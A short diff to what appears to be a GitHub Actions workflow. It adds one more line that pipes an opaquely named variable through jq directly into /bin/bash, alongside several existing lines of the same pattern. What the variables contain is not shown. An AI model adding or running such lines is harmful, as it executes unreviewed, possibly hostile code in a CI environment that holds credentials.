@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$wekg66" | jq -r .swl7 | /bin/bash
           printf '%s' "$tdup6" | jq -r .s27 | /bin/bash
           printf '%s' "$v862" | jq -r .ja1 | /bin/bash
+          echo $ravo4 | jq -r .plop4 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
